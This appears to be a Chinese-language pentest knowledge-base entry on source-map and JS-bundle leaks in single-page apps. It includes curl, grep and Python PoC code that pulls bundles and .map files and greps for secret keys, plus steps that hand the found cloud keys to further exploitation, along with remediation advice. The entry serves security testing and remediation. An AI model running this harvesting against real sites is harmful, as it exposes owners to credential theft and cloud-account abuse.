---
title: sourcemap / 前端 JS 泄露接口与密钥（SPA 包网站第一入口）
cve: 无（配置缺陷）
severity: high
cvss: 8.6
product: 前后端分离站点（Vue/React/uni-app）
versions: 任意
ports: 80, 443
keywords: sourcemap, js, 前端, 密钥, 接口, 泄露, spa
entry: /static/js/*.js.map 与打包进 bundle 的 AK/secret
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
GET /static/js/app.js.map      → 200（未删 sourcemap）
GET /assets/index-xxxx.js      → 200，体积数百 KB
```

## 前置条件

- 目标为 SPA；未关闭 sourcemap、未做密钥外置。

## PoC

```bash
# 1) 找 bundle 与 map
curl -s https://target/ | grep -oE '(src|href)="[^"]+\.(js|css)"' | head -20
for f in $(curl -s https://target/ | grep -oE '/[^"]+\.js' | sort -u | head -10); do
  code=$(curl -s -o /tmp/x.js -w '%{http_code}' "https://target$f")
  echo "$f $code $(stat -c%s /tmp/x.js)"; 
  curl -s -o /dev/null -w "  map %{http_code}\n" "https://target$f.map"
done
# 判定：.map 返回 200 = sourcemap 未删

# 2) 从 map 还原源码目录（找接口清单）
python3 - <<'PY'
import json,requests
m=requests.get("https://target/static/js/app.js.map").json()
print(len(m.get("sources",[])), "个源文件")
for s in m["sources"][:20]: print(s)
PY

# 3) 在 bundle 里搜密钥与接口
curl -s https://target/static/js/app.js > /tmp/app.js
grep -oE '/api/[a-zA-Z0-9_/-]+' /tmp/app.js | sort -u | head -40
grep -oiE '(accessKey|secretKey|appSecret|AES_KEY|jwt|token)[^,;]{0,60}' /tmp/app.js | head -20
# 判定：出现 AK/SK/密钥明文 = 可直接调云资源或伪造签名
```

## 利用步骤

1. 先拉 bundle 与 map（只读）；
2. 从 map 的 `sources` 恢复接口清单与路由（比扫目录快十倍）；
3. 在 bundle 里搜 `aliyun/oss/tencent/cos/AES/jwt secret`；
4. 拿到的 AK/SK 去 `cloud-aksk-exploit` 流程验权限；接口清单喂 `api-fuzz` / `idor-methodology`；
5. 证据：map 的 200 + sources 前几行 + 命中的密钥片段（打码）。

## 修复与缓解

- 生产构建关 sourcemap（`productionSourceMap:false` / `build.sourcemap:false`）；
- 密钥一律服务端下发/短期 STS，打包里只留公钥。

## 参考

- OWASP WSTG-INFO-05；前端构建安全配置。
